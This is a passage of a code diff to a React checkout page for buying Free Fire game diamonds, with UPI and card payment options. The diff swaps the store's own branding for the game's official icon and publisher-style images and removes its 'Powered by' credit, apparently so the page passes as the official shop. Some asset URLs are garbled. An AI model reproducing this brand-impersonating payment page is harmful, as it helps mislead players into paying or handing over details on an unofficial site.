31.6661 12.5633C31.6661 12.5633 31.2639 13.5216 29.4074 14.6231C26.6483 16.2595 26.2915 16.8663 26.2915 16.8663C26.2915 16.8663 26.524 16.7404 27.323 16.3371C25.4002 17.9829 24.1496 19.823 24.1496 19.823L23.9527 19.8811L24.0795 19.9951L24.253 20.0642L24.1947 20.2029L23.9757 20.2253C23.9757 20.2253 23.9527 20.5479 24.1612 20.6409C23.7903 20.9279 23.4314 21.3074 23.4314 21.3074L23.6159 21.3879C23.6159 21.3879 23.8709 21.6289 23.5465 21.9177C23.2687 22.2166 23.2568 21.837 23.2568 21.837C23.2568 21.837 23.2454 22.3198 22.6085 22.6538C22.4812 22.6992 22.2727 22.6416 22.2727 22.6416L21.9595 22.9987C21.9595 22.9987 24.1612 22.838 26.1071 22.032C22.539 23.7813 20.5126 23.7813 20.5126 23.7813V24.0341L20.7904 24.1037C20.7904 24.1037 20.0723 24.5398 17.3621 24.7826C17.8246 24.9317 17.8947 24.9205 17.8947 24.9205C17.8947 24.9205 17.2572 25.1273 15.7178 25.23C16.3083 25.4379 16.898 25.5081 16.898 25.5081L12.3351 25.5421C8.82523 25.5069 1.68961 22.5415 3.50964 16.1181C5.45538 9.25017 14.1769 8.04375 14.1769 8.04375C14.1769 8.04375 9.96545 6.80094 6.18486 8.55928C2.3281 10.3553 0 9.31929 0 9.31929L1.67998 7.67337L1.07749 7.83464L2.22304 6.81038L2.3044 6.95969L3.86842 5.30346L3.99579 5.50048L4.11213 5.61466L4.1575 5.41789L4.05409 5.2458L4.54036 4.71781L4.48232 4.67135L4.85301 4.08419L5.13107 4.02666L5.98804 3.11721C5.98804 3.11721 5.46729 3.71646 5.13107 4.32603C4.96847 4.87756 4.63301 5.10757 4.63301 5.10757C4.63301 5.10757 4.65582 5.15453 4.71373 5.25688C5.00345 4.48705 6.61284 3.67001 6.61284 3.67001C6.61284 3.67001 6.26635 3.94647 5.89515 4.32603C6.43947 3.8426 10.2161 1.35762 10.2161 1.35762L10.3776 1.36908L10.3896 1.49509C10.3896 1.49509 8.32729 2.99031 7.34321 4.02666C8.21108 3.76254 9.20822 2.9212 9.20822 2.9212L9.2655 3.09481L9.56713 3.11721L9.67092 3.03778L9.94911 2.85246L10.053 2.78347L10.0884 2.58771L10.4583 2.60068L10.4933 2.69195H10.5864L10.7243 2.63505L10.7712 2.51948L10.6902 2.39296L10.7712 2.28922C10.7712 2.28922 10.8641 2.38125 10.9565 2.50865C11.2815 2.19707 12.6137 1.87491 12.6137 1.87491C12.6137 1.87491 12.5323 1.9901 12.4399 2.09359C16.0297 1.42611 19.0416 0.218171 19.0416 0.218171L19.2839 0.206337L19.3079 0.126396L19.5397 0.10298Z" fill="#E41E26"/>
+          </g>
+        </svg>
 
+            {/* Amber divider */}
             <div style={{
               width: 2, height: isMobile ? 18 : 22,
               background: '#f59e0b', borderRadius: 4,
               margin: '0 10px', flexShrink: 0
             }} />
 
+            {/* Title — hide on very small screens */}
             <span style={{
               color: '#111', fontWeight: 900,
               fontSize: isMobile ? 10 : 12,
@@ -854,6 +615,7 @@ export default function GarenaCheckout() {
             </span>
           </div>
 
+          {/* Right: player badge */}
           <div style={{
             background: '#fff0ef', border: '1px solid #fecaca',
             borderRadius: 999, padding: isMobile ? '4px 10px' : '5px 14px',
@@ -883,7 +645,7 @@ export default function GarenaCheckout() {
       }}>
         <div style={{
           position: 'absolute', inset: 0,
-          backgroundImage: 'linear-gradient(125deg, #513d32, #94765e)',
+          backgroundImage: 'url("https://assets.FF INDIA.com/gop/mshop/www/live/assets/FF-f997537d.jpg")',
           backgroundSize: 'cover', backgroundPosition: 'center top',
         }} />
         <div style={{ position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.38)' }} />
@@ -892,51 +654,44 @@ export default function GarenaCheckout() {
           display: 'flex', alignItems: 'center',
           padding: isMobile ? '0 14px' : '0 24px',
           gap: isMobile ? 10 : 14,
-          maxWidth: 480,
+          maxWidth: isDesktop ? 1200 : '100%',
           margin: '0 auto',
         }}>
-          <span className="store-monogram" aria-hidden="true">FS</span>
+          <img
+            src="https://play-lh.googleusercontent.com/_NBURlh6AOFiEpNimyU5bPNo6BI2zg4LA3cq-yprkXIhrvKTil-IOzGcuvc2hiuib4yxx11Lf5E1NFnKM6Uvpw=s120-rw"
+            alt="Free Fire"
+            style={{
+              width: isMobile ? 44 : 52, height: isMobile ? 44 : 52,
+              borderRadius: 10, border: '2px solid rgba(255,255,255,0.6)',
+              objectFit: 'cover', flexShrink: 0,
+              display: 'block'
+            }}
+            onError={(e) => {
+              (e.target as HTMLImageElement).src =
+                'https://cdn-gop.FF INDIAnow.com/gop/app/0000/100/067/icon.png';
+            }}
+          />
           <div>
             <h1 style={{
               color: 'white', fontSize: isMobile ? 14 : 16,
               fontWeight: 900, margin: '0 0 5px',
-            }}>Free Fire Store</h1>
-            <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', alignItems: 'center' }}>
+            }}>Free Fire</h1>
+            <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
               <span style={{
-                background: 'rgba(18, 18, 18, 0.85)',
-                border: '1px solid rgba(255, 255, 255, 0.15)',
-                color: 'white',
-                borderRadius: 20,
-                padding: isMobile ? '3px 8px' : '4px 10px',
-                fontSize: isMobile ? 9 : 10,
-                fontWeight: 900,
-                letterSpacing: '0.4px',
-                display: 'inline-flex',
-                alignItems: 'center',
-                gap: 4
-              }}>
-                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#10b981" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
-                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-                  <path d="m9 12 2 2 4-4" />
-                </svg>
-                100% SECURE PAYMENTS
-              </span>
+                background: 'rgba(0,0,0,0.55)',
+                border: '1px solid rgba(255,255,255,0.1)',
+                color: 'white', borderRadius: 5,
+                padding: isMobile ? '2px 6px' : '2px 8px',
+                fontSize: isMobile ? 8 : 9,
+                fontWeight: 700, letterSpacing: '0.4px',
+              }}>✓ 100% SECURE PAYMENTS</span>
               <span style={{
-                background: 'linear-gradient(135deg, #eab308, #ca8a04)',
-                color: '#1a1a1a',
-                borderRadius: 20,
-                padding: isMobile ? '3px 8px' : '4px 10px',
-                fontSize: isMobile ? 9 : 10,
+                background: 'linear-gradient(to right, #f59e0b, #eab308)',
+                color: 'black', borderRadius: 5,
+                padding: isMobile ? '2px 6px' : '2px 8px',
+                fontSize: isMobile ? 8 : 9,
                 fontWeight: 900,
-                display: 'inline-flex',
-                alignItems: 'center',
-                gap: 4
-              }}>
-                <svg width="11" height="11" viewBox="0 0 24 24" fill="currentColor">
-                  <path d="M12 2l2.4 5.2 5.6.8-4 4.1 1 5.7-5-2.8-5 2.8 1-5.7-4-4.1 5.6-.8z" />
-                </svg>
-                9TH ANNIVERSARY
-              </span>
+              }}>✦ 9TH ANNIVERSARY</span>
             </div>
           </div>
         </div>
@@ -949,10 +704,10 @@ export default function GarenaCheckout() {
         boxSizing: 'border-box'
       }}>
         <div style={{
-          display: 'flex',
-          flexDirection: 'column',
-          gap: 16,
-          maxWidth: 480,
+          display: isDesktop ? 'grid' : 'block',
+          gridTemplateColumns: isDesktop ? '1fr 1fr' : 'none',
+          gap: isDesktop ? 20 : 0,
+          maxWidth: isDesktop ? 1100 : 560,
           margin: '0 auto',
         }}>
           
@@ -968,7 +723,7 @@ export default function GarenaCheckout() {
               </div>
               <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
                 <span style={{ color: '#777' }}>UID</span>
-                <span style={{ fontWeight: 700, color: '#111', fontFamily: 'monospace', letterSpacing: '0.5px' }}>{uid || 'N/A'}</span>
+                <span style={{ fontWeight: 700, color: '#111', fontFamily: 'monospace', letterSpacing: '0.5px' }}>{uid}</span>
               </div>
 
               <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
@@ -980,11 +735,11 @@ export default function GarenaCheckout() {
 
               <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
                 <span style={{ color: '#777' }}>Diamonds</span>
-                <span style={{ fontWeight: 800, color: '#ee2c24', fontSize: 14 }}>💎 {diamonds || 'Topup'}</span>
+                <span style={{ fontWeight: 800, color: '#ee2c24', fontSize: 14 }}>💎 {diamonds}</span>
               </div>
 
               <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', paddingTop: 16, fontSize: isMobile ? 14 : 15 }}>
-                <span style={{ fontWeight: 800, color: '#111' }}>Total Amount</span>
+                <span style={{ fontWeight: 800, color: '#111' }}>Total</span>
                 <span style={{ fontWeight: 900, fontSize: isMobile ? 22 : 26, color: '#111' }}>₹{pkg}</span>
               </div>
             </div>
@@ -1056,7 +811,7 @@ export default function GarenaCheckout() {
                 />
               </div>
 
-              <div style={{ marginBottom: 12 }}>
+              <div style={{ marginBottom: 4 }}>
                 <label style={{ fontSize: 12, fontWeight: 700, color: '#555', marginBottom: 6, display: 'block' }}>
                   Email Address
                 </label>
@@ -1125,11 +880,10 @@ export default function GarenaCheckout() {
                   marginTop: 4,
                 }}
               >
-                {loading ? '⏳ Processing…' : `🔒 Pay ₹${pkg}`}
+                {loading ? '⏳ Processing…' : '🔒 Pay Now'}
               </button>
             )}
-
-            {/* PAYMENT METHOD SELECTION MODAL */}
+            {/* PAYMENT MODAL */}
             {showPayModal && (
               <div
                 onClick={() => setShowPayModal(false)}
@@ -1148,24 +902,21 @@ export default function GarenaCheckout() {
                     width: '100%', maxWidth: 480, boxSizing: 'border-box',
                   }}
                 >
+                  {/* Handle bar */}
                   <div style={{ width: 36, height: 4, background: '#e0e0e0', borderRadius: 4, margin: '0 auto 20px' }} />
 
                   <div style={{ textAlign: 'center', marginBottom: 22 }}>
-                    <div style={{ fontSize: 17, fontWeight: 900, color: '#111', letterSpacing: -0.3 }}>
-                      Choose Payment Method
-                    </div>
-                    <div style={{ fontSize: 12, color: '#aaa', marginTop: 4, fontWeight: 500 }}>
-                      Fast · Secure · Instant Diamond Credit
-                    </div>
+                    <div style={{ fontSize: 17, fontWeight: 900, color: '#111', letterSpacing: -0.3 }}>Choose Payment Method</div>
+                    <div style={{ fontSize: 12, color: '#aaa', marginTop: 4, fontWeight: 500 }}>Fast · Secure · Instant delivery</div>
                   </div>
 
-                  {/* Option 1 — UPI / QR */}
+                  {/* Option 1 — UPI QR */}
                   <button
-                    onClick={() => handlePay('QR')}
+                    onClick={() => { setShowPayModal(false); handlePay(); }}
                     disabled={loading}
                     style={{
                       width: '100%', display: 'flex', alignItems: 'center', gap: 12,
-                      padding: '14px 16px', marginBottom: 12,
+                      padding: '14px 16px', marginBottom: 10,
                       background: '#fff', border: '2px solid #ebebeb', borderRadius: 16,
                       cursor: 'pointer', textAlign: 'left', boxSizing: 'border-box',
                       WebkitTapHighlightColor: 'transparent', outline: 'none',
@@ -1183,15 +934,15 @@ export default function GarenaCheckout() {
                         onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                     </div>
                     <div style={{ flex: 1, minWidth: 0 }}>
-                      <div style={{ fontWeight: 800, color: '#111', fontSize: 14, whiteSpace: 'nowrap' }}>Pay via UPI / QR Code</div>
-                      <div style={{ fontSize: 11, color: '#999', marginTop: 3, fontWeight: 500 }}>GPay · PhonePe · Paytm · QR Scan</div>
+                      <div style={{ fontWeight: 800, color: '#111', fontSize: 14, whiteSpace: 'nowrap' }}>Pay via UPI / QR</div>
+                      <div style={{ fontSize: 11, color: '#999', marginTop: 3, fontWeight: 500 }}>GPay · PhonePe · Paytm & more</div>
                     </div>
                     <span style={{ color: '#ccc', fontSize: 20, flexShrink: 0 }}>›</span>
                   </button>
 
-                  {/* Option 2 — Card / Net Banking */}
+                  {/* Option 2 — Cards */}
                   <button
-                    onClick={() => handlePay('ALL')}
+                    onClick={() => { setShowPayModal(false); handlePay(); }}
                     disabled={loading}
                     style={{
                       width: '100%', display: 'flex', alignItems: 'center', gap: 12,
@@ -1214,13 +965,13 @@ export default function GarenaCheckout() {
                     </div>
                     <div style={{ flex: 1, minWidth: 0 }}>
                       <div style={{ fontWeight: 800, color: '#111', fontSize: 14, whiteSpace: 'nowrap' }}>Card / Net Banking</div>
-                      <div style={{ fontSize: 11, color: '#999', marginTop: 3, fontWeight: 500 }}>Credit Card · Debit Card · Netbanking</div>
+                      <div style={{ fontSize: 11, color: '#999', marginTop: 3, fontWeight: 500 }}>Visa · Mastercard · UPI & wallets</div>
                     </div>
                     <span style={{ color: '#ccc', fontSize: 20, flexShrink: 0 }}>›</span>
                   </button>
 
-                  <div style={{ textAlign: 'center', fontSize: 11, color: '#aaa', fontWeight: 500 }}>
-                    🔒 100% Secure · SSL Encrypted · Powered by Free Fire Store
+                  <div style={{ textAlign: 'center', fontSize: 11, color: '#ccc', fontWeight: 500 }}>
+                    🔒 100% Secure · SSL Encrypted
                   </div>
                 </div>
               </div>
